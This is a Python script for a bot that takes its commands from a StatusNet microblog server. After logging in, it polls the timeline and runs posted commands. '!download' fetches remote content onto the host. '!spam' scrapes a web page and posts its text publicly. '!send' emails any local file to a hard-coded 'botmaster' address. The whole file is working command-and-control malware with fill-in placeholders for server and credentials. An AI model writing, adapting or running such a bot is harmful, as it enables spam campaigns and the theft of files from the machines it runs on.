from bs4 import BeautifulSoup
import requests, urllib2, os.path, subprocess

"""
You may need to know below commands to execute

!download url
!spam url
!send filepath

"""

server='__replace_your_server_ip_here'
nickname='__replace_your_nickname_here'
password='__replace_your_password_here'
token=''
cookie=''
login_path='/statusnet/index.php/main/login'
notif_path='/statusnet/index.php/notice/new'
login_payload = {'nickname':nickname, 'password':password,'submit':'Login'}
login_url='http://' + server + login_path
notif_url='http://' + server + notif_path

botmaster='botmaster@botmaster.com'

tmp_path = '/tmp/statusnet_bot'

def download(url):
    fp = open(tmp_path, 'w')
    fp.write(urllib2.urlopen(url).read())
    fp.close()
    print("[+] Web Page Downloaded "),
    print(': ' + tmp_path)

def spam(url):
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    data = soup.get_text()
    global token
    global cookie
    spam_payload={'token':token,'status_textarea':data,'MAX_FILE_SIZE':5000000,'attach':'','returnto':'public','inreplyto':'','notice_to':'public:everyone','lat':'','lon':'','location_id':'','location_ns':'','status_submit':'Send','ajax':1}
    requests.post(notif_url, params=spam_payload, cookies=cookie)
    print("[+] Spam Message Sent")

def send(fpath):
    if os.path.isfile(fpath):
	p1 = subprocess.Popen(["echo", "File Attached"], stdout=subprocess.PIPE)
	p2 = subprocess.Popen(["mail", "-s", "Greetings from Bot", botmaster, "-A", fpath], stdin=p1.stdout, stdout=subprocess.PIPE)
	p1.stdout.close()
	p2.communicate()[0]
	print("[+] File Emailed")
    else:
	print("[-] File Not Found")

def connect():
    return requests.post(login_url, params=login_payload, allow_redirects=True)

def validate(string):
    if len(string.split()) > 1:
	return True
    else:
	 return False

def main():
    print("[+] Starting the Bot")

    try:
        conn = connect()
        page = conn.text
        url = conn.url
	global cookie
	cookie=conn.cookies

        soup = BeautifulSoup(page, 'html.parser')
        data = soup.find('p',{'class':'entry-content'}).getText()

	global token
	token=soup.find('input', {'name':'token'})['value']

        while True:
            _conn = requests.get(url)
            _page = _conn.text
            _soup = BeautifulSoup(_page, 'html.parser')
            _data = _soup.find('p',{'class':'entry-content'}).getText()

            if data != _data and validate(_data):
                    if _data.startswith('!download'):
			download(_data.split()[1])
                    elif _data.startswith('!spam'):
			spam(_data.split()[1])
                    elif _data.startswith('!send'):
			send(_data.split()[1])

            data = _data

    except KeyboardInterrupt:
        print("[-] Quitting ... Bye")

if __name__ == '__main__':
    main()
